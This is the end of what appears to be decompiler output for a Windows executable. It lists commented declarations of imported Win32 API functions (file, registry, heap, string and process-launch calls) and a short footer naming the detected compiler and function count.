// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// LPVOID HeapAlloc(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ SIZE_T dwBytes);
// BOOL HeapFree(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpiA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrlenA(_In_ LPCSTR lpString);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// VOID RtlZeroMemory(_Out_ VOID * Destination, _In_ SIZE_T Length);
// DWORD SetFilePointer(_In_ HANDLE hFile, _In_ LONG lDistanceToMove, _Inout_opt_ PLONG lpDistanceToMoveHigh, _In_ DWORD dwMoveMethod);
// HINSTANCE ShellExecuteA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpOperation, _In_ LPCSTR lpFile, _In_opt_ LPCSTR lpParameters, _In_opt_ LPCSTR lpDirectory, _In_ INT nShowCmd);
// UINT WinExec(_In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft
// Detected functions: 39
